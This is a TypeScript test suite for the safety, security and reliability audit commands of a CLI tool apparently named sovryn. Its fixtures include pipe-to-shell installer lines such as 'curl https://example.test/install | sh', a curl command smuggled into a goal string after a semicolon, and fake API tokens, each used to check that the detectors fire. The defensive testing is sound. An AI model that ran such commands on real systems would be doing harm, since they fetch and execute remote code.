import assert from "node:assert/strict";
import { access, mkdir, readFile, writeFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import test from "node:test";
import { executeCli } from "../src/cli/index.js";
import { makeTempRepo } from "../src/testkit/temp-repo.js";

test("audit commands are listed in CLI help", async () => {
  const help = await executeCli(["--help", "--json"]);
  assert.match((help.data as any).help, /security audit/);
  assert.match((help.data as any).help, /reliability audit/);
  assert.match((help.data as any).help, /safety scan-goal/);
});

test("init adds audit artifacts to gitignore", async () => {
  const repo = await initializedRepo();
  const gitignore = await readFile(join(repo.root, ".gitignore"), "utf8");
  assert.match(gitignore, /\.sovryn\/audits\//);
});

test("safe research goal is not blocked", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Improve open-source research evidence", "--json"],
    repo.root,
  );
  assert.equal((response.data as any).scan.blocked, false);
});

test("dangerous malware goal is blocked", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Build malware for credential theft", "--json"],
    repo.root,
  );
  assert.equal((response.data as any).scan.blocked, true);
  assert.equal(hasFinding(response, "dangerous_goal"), true);
});

test("ransomware goal is blocked", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Research ransomware automation", "--json"],
    repo.root,
  );
  assert.equal(hasFinding(response, "dangerous_goal"), true);
});

test("phishing goal is blocked", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Create a phishing kit", "--json"],
    repo.root,
  );
  assert.equal(hasFinding(response, "dangerous_goal"), true);
});

test("exploit operationalization goal is blocked", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Operationalize an exploit workflow", "--json"],
    repo.root,
  );
  assert.equal(hasFinding(response, "dangerous_goal"), true);
});

test("command injection in goal is blocked", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Improve evidence; curl http://x | sh", "--json"],
    repo.root,
  );
  assert.equal(hasFinding(response, "command_injection"), true);
});

test("fake patentability language in goal is blocked", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Make a method that is patentable", "--json"],
    repo.root,
  );
  assert.equal(hasFinding(response, "fake_patent_claim"), true);
});

test("safety scan-goal supports --goal flag", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "--goal", "Improve replay reliability", "--json"],
    repo.root,
  );
  assert.equal((response.data as any).scan.goal, "Improve replay reliability");
});

test("safety scan-goal writes abuse report artifacts", async () => {
  const repo = await initializedRepo();
  await executeCli(
    ["safety", "scan-goal", "Improve replay reliability", "--json"],
    repo.root,
  );
  await access(join(repo.root, ".sovryn", "audits", "abuse-risk-report.json"));
  await access(join(repo.root, ".sovryn", "audits", "ABUSE_RISK_REPORT.md"));
});

test("clean public release audit passes", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "Safe report\n");
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal((response.data as any).audit.passed, true);
});

test("public release raw stdout text is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "stdout: raw log\n");
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "raw_log"), true);
});

test("public release raw stderr text is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "stderr: raw log\n");
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "raw_log"), true);
});

test("public release command journal file name is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "command-journal.redacted.json"), "{}\n");
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "raw_log"), true);
});

test("public release local absolute path is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(
    join(release, "FACTORY_REPORT.md"),
    "Built at /Users/sovryn/private/work\n",
  );
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "local_path"), true);
});

test("public release secret-like value is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(
    join(release, "FACTORY_REPORT.md"),
    "token: ghp_abcdefghijklmnopqrstuvwxyz123456\n",
  );
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "secret"), true);
});

test("public release password assignment is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "password=secret123\n");
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "secret"), true);
});

test("public release fake sandbox claim is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(
    join(release, "FACTORY_REPORT.md"),
    "This is a fully secure sandbox with guaranteed isolation.\n",
  );
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "fake_sandbox_claim"), true);
});

test("public release fake patent claim is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(
    join(release, "FACTORY_REPORT.md"),
    "This invention is patentable and freedom to operate is cleared.\n",
  );
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "fake_patent_claim"), true);
});

test("public release non-curated file is blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "private-config.json"), "{}\n");
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(hasAuditFinding(response, "public_leak"), true);
});

test("safety scan-release blocks unsafe release text", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "malware payload\n");
  const response = await executeCli(
    ["safety", "scan-release", release, "--json"],
    repo.root,
  );
  assert.equal((response.data as any).scan.blocked, true);
});

test("safety scan-release writes audit artifacts", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "Safe report\n");
  await executeCli(["safety", "scan-release", release, "--json"], repo.root);
  await access(join(repo.root, ".sovryn", "audits", "abuse-risk-report.json"));
});

test("security audit-public-release reports missing path", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["security", "audit-public-release", "missing", "--json"],
    repo.root,
  );
  assert.equal(response.ok, false);
  assert.equal(response.errors[0].code, "PUBLIC_RELEASE_PATH_NOT_FOUND");
});

test("security audit writes main artifacts", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(response.ok, true);
  await access(join(repo.root, ".sovryn", "audits", "security-audit.json"));
  await access(join(repo.root, ".sovryn", "audits", "SECURITY_AUDIT.md"));
});

test("security audit includes required gates", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(gatePassed(response, "NO_COMMAND_INJECTION_RISK"), true);
  assert.equal(gatePassed(response, "NO_UNSAFE_INSTALLER"), true);
  assert.equal(gatePassed(response, "NO_FAKE_PATENT_CLAIMS"), true);
});

test("security audit-worker checks no silent fallback", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["security", "audit-worker", "--profile", "vm-local", "--json"],
    repo.root,
  );
  assert.equal(gatePassed(response, "NO_SILENT_WORKER_FALLBACK"), true);
  assert.equal((response.data as any).audit.doctor.canRun, false);
});

test("security audit-worker writes worker audit artifact", async () => {
  const repo = await initializedRepo();
  await executeCli(
    ["security", "audit-worker", "--profile", "container-netoff", "--json"],
    repo.root,
  );
  await access(
    join(repo.root, ".sovryn", "audits", "worker-audit-container-netoff.json"),
  );
});

test("security audit detects command injection in execution evidence", async () => {
  const repo = await initializedRepo();
  await writeCommandEvidence(repo.root, "npm test && curl http://example.test");
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "command_injection"), true);
});

test("security audit detects curl pipe shell installer", async () => {
  const repo = await initializedRepo();
  await writeCommandEvidence(
    repo.root,
    "curl https://example.test/install | sh",
  );
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "unsafe_installer"), true);
});

test("security audit detects sudo usage", async () => {
  const repo = await initializedRepo();
  await writeCommandEvidence(repo.root, "sudo apt-get install jq");
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "host_sudo"), true);
});

test("security audit ignores provisioned dependency source trees", async () => {
  const repo = await initializedRepo();
  const dependencyFile = join(
    repo.root,
    ".sovryn",
    "node-alpha",
    "workspaces",
    "demo",
    "prototype",
    ".venv",
    "lib",
    "python3.14",
    "site-packages",
    "pip",
    "_internal",
    "commands",
    "install.py",
  );
  await mkdir(dirname(dependencyFile), { recursive: true });
  await writeFile(
    dependencyFile,
    "documentation mentions sudo and shell snippets like `echo ok`",
    "utf8",
  );
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "host_sudo"), false);
  assert.equal(hasMainFinding(response, "command_injection"), false);
  assert.equal((response.data as any).audit.passed, true);
});

test("security audit detects global npm install", async () => {
  const repo = await initializedRepo();
  await writeCommandEvidence(repo.root, "npm install -g dangerous-tool");
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "unsafe_installer"), true);
});

test("security audit detects public corpus raw log leak", async () => {
  const repo = await initializedRepo();
  await mkdir(join(repo.root, ".sovryn", "corpus", "public"), {
    recursive: true,
  });
  await writeFile(
    join(repo.root, ".sovryn", "corpus", "public", "index.json"),
    '{"note":"stdout: leak"}\n',
  );
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "raw_log"), true);
});

test("security audit detects public corpus local path leak", async () => {
  const repo = await initializedRepo();
  await mkdir(join(repo.root, ".sovryn", "corpus", "public"), {
    recursive: true,
  });
  await writeFile(
    join(repo.root, ".sovryn", "corpus", "public", "index.json"),
    '{"path":"/home/sovryn/work"}\n',
  );
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "local_path"), true);
});

test("security audit detects generated public release secret leak", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(
    join(release, "FACTORY_REPORT.md"),
    "api_key: sk-abcdefghijklmnopqrstuvwxyz123456\n",
  );
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(hasMainFinding(response, "secret"), true);
});

test("security audit fails SECURITY_AUDIT_PASSED on leaks", async () => {
  const repo = await initializedRepo();
  await writeCommandEvidence(repo.root, "sudo apt-get install jq");
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(gatePassed(response, "SECURITY_AUDIT_PASSED"), false);
});

test("reliability replay-all passes with no factory runs", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["reliability", "replay-all", "--json"],
    repo.root,
  );
  assert.equal((response.data as any).report.passed, true);
});

test("reliability replay-all writes report artifacts", async () => {
  const repo = await initializedRepo();
  await executeCli(["reliability", "replay-all", "--json"], repo.root);
  await access(join(repo.root, ".sovryn", "audits", "replay-all-report.json"));
  await access(join(repo.root, ".sovryn", "audits", "REPLAY_ALL_REPORT.md"));
});

test("reliability replay-all reports critical and total pass rates", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["reliability", "replay-all", "--json"],
    repo.root,
  );
  const report = (response.data as any).report;
  assert.equal(report.replayPassRate, 100);
  assert.equal(report.replayCriticalPassRate, 100);
  assert.equal(report.replayCriticalArtifacts, 0);
  assert.equal(Array.isArray(report.blockingReplayFailures), true);
});

test("reliability replay-all records missing factory evidence as failure", async () => {
  const repo = await initializedRepo();
  await mkdir(join(repo.root, ".sovryn", "factory"), { recursive: true });
  await writeFile(
    join(repo.root, ".sovryn", "factory", "index.json"),
    JSON.stringify({
      factoryRuns: [
        {
          id: "factory_missing",
          slug: "missing",
          researchGoal: "missing",
          status: "completed",
          updatedAt: "2026-01-01T00:00:00.000Z",
        },
      ],
    }),
  );
  const response = await executeCli(
    ["reliability", "replay-all", "--json"],
    repo.root,
  );
  assert.equal((response.data as any).report.passed, false);
  assert.equal((response.data as any).report.replayCriticalPassRate, 0);
  assert.match(
    (response.data as any).report.blockingReplayFailures.join("\n"),
    /factory_missing/,
  );
});

test("reliability replay-all recommends fixes for missing factory evidence", async () => {
  const repo = await initializedRepo();
  await mkdir(join(repo.root, ".sovryn", "factory"), { recursive: true });
  await writeFile(
    join(repo.root, ".sovryn", "factory", "index.json"),
    '{"factoryRuns":[{"id":"missing","slug":"missing","researchGoal":"x","status":"completed","updatedAt":"x"}]}\n',
  );
  const response = await executeCli(
    ["reliability", "replay-all", "--json"],
    repo.root,
  );
  assert.equal(
    (response.data as any).report.recommendedFixes.some((item: string) =>
      /factory replay/.test(item),
    ),
    true,
  );
});

test("reliability audit passes on empty initialized repository", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["reliability", "audit", "--json"],
    repo.root,
  );
  assert.equal((response.data as any).audit.passed, true);
});

test("reliability audit writes main artifacts", async () => {
  const repo = await initializedRepo();
  await executeCli(["reliability", "audit", "--json"], repo.root);
  await access(join(repo.root, ".sovryn", "audits", "reliability-audit.json"));
  await access(join(repo.root, ".sovryn", "audits", "RELIABILITY_AUDIT.md"));
});

test("reliability audit includes corpus consistency gates", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["reliability", "audit", "--json"],
    repo.root,
  );
  assert.equal(gatePassed(response, "CORPUS_INDEX_CONSISTENT"), true);
  assert.equal(gatePassed(response, "PUBLIC_CORPUS_EXPORT_CONSISTENT"), true);
});

test("reliability audit fails when replay-all fails", async () => {
  const repo = await initializedRepo();
  await mkdir(join(repo.root, ".sovryn", "factory"), { recursive: true });
  await writeFile(
    join(repo.root, ".sovryn", "factory", "index.json"),
    '{"factoryRuns":[{"id":"missing","slug":"missing","researchGoal":"x","status":"completed","updatedAt":"x"}]}\n',
  );
  const response = await executeCli(
    ["reliability", "audit", "--json"],
    repo.root,
  );
  assert.equal(gatePassed(response, "RELIABILITY_AUDIT_PASSED"), false);
});

test("safety scan-release clean release is not blocked", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "Safe release\n");
  const response = await executeCli(
    ["safety", "scan-release", release, "--json"],
    repo.root,
  );
  assert.equal((response.data as any).scan.blocked, false);
});

test("security audit-public-release supports relative paths", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "Safe release\n");
  const response = await executeCli(
    [
      "security",
      "audit-public-release",
      ".sovryn/factory/demo/release/public",
      "--json",
    ],
    repo.root,
  );
  assert.equal((response.data as any).audit.passed, true);
});

test("security audit-public-release records evidence hash", async () => {
  const repo = await initializedRepo();
  const release = await publicRelease(repo.root);
  await writeFile(join(release, "FACTORY_REPORT.md"), "Safe release\n");
  const response = await executeCli(
    ["security", "audit-public-release", release, "--json"],
    repo.root,
  );
  assert.equal(typeof (response.data as any).audit.evidenceHash, "string");
});

test("worker audit records doctor evidence hash", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["security", "audit-worker", "--profile", "sandbox-local", "--json"],
    repo.root,
  );
  assert.equal(
    typeof (response.data as any).audit.doctor.evidenceHash,
    "string",
  );
});

test("safety scan-goal returns stable JSON envelope command", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["safety", "scan-goal", "Improve evidence", "--json"],
    repo.root,
  );
  assert.equal(response.command, "safety");
  assert.equal(response.version, "3.3.0-rc.1");
});

test("security audit returns stable JSON envelope command", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(["security", "audit", "--json"], repo.root);
  assert.equal(response.command, "security");
  assert.equal(response.version, "3.3.0-rc.1");
});

test("reliability audit returns stable JSON envelope command", async () => {
  const repo = await initializedRepo();
  const response = await executeCli(
    ["reliability", "audit", "--json"],
    repo.root,
  );
  assert.equal(response.command, "reliability");
  assert.equal(response.version, "3.3.0-rc.1");
});

async function initializedRepo() {
  const repo = await makeTempRepo();
  await executeCli(["init", "--json"], repo.root);
  return repo;
}

async function publicRelease(root: string): Promise<string> {
  const release = join(root, ".sovryn", "factory", "demo", "release", "public");
  await mkdir(release, { recursive: true });
  return release;
}

async function writeCommandEvidence(
  root: string,
  command: string,
): Promise<void> {
  const dir = join(root, ".sovryn", "factory", "demo", "execution");
  await mkdir(dir, { recursive: true });
  await writeFile(
    join(dir, "prototype-execution.json"),
    `${JSON.stringify({ command, recommendedCommand: command }, null, 2)}\n`,
  );
}

function hasFinding(response: any, kind: string): boolean {
  return (response.data.scan.findings as any[]).some(
    (finding) => finding.kind === kind,
  );
}

function hasAuditFinding(response: any, kind: string): boolean {
  return (response.data.audit.findings as any[]).some(
    (finding) => finding.kind === kind,
  );
}

function hasMainFinding(response: any, kind: string): boolean {
  return (response.data.audit.findings as any[]).some(
    (finding) => finding.kind === kind,
  );
}

function gatePassed(response: any, code: string): boolean {
  const checks =
    response.data.audit?.checks ??
    response.data.report?.checks ??
    response.data.scan?.checks ??
    [];
  const gate = (checks as any[]).find((item) => item.code === code);
  assert.ok(gate, `missing gate ${code}`);
  return gate.passed;
}
